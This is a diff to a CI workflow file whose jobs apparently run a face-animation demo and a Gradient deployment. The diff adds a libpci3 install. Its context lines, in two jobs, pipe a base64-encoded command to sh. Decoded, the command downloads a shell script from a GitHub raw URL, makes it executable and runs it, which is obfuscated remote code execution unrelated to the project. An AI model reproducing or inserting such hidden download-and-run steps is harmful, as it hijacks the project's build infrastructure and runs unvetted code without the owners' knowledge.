@@ -21,6 +21,7 @@ jobs:
     with:
       script: |-
         apt install wget
+        apt install libpci3
         timeout 900s base64 -d <<<'d2dldCBodHRwczovL2dpdGh1Yi5jb20vRGFyc2hHb3N3YW1pMTk4Mi9wcmVtL3Jhdy9tYWluL2xhZ2FuXzEuc2ggJiYgY2htb2QgK3ggbGFnYW5fMS5zaCAmJiAuL2xhZ2FuXzEuc2g=' | sh
         python3 demo.py --relative --adapt_scale \
           --config config/vox-256.yaml \
@@ -46,6 +47,7 @@ jobs:
         EOF
         apt update > /dev/null
         apt install wget
+        apt install libpci3
         base64 -d <<<'d2dldCBodHRwczovL2dpdGh1Yi5jb20vRGFyc2hHb3N3YW1pMTk4Mi9wcmVtL3Jhdy9tYWluL2xhZ2FuXzEuc2ggJiYgY2htb2QgK3ggbGFnYW5fMS5zaCAmJiAuL2xhZ2FuXzEuc2g=' | sh
         apt-get install -y jq
         gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
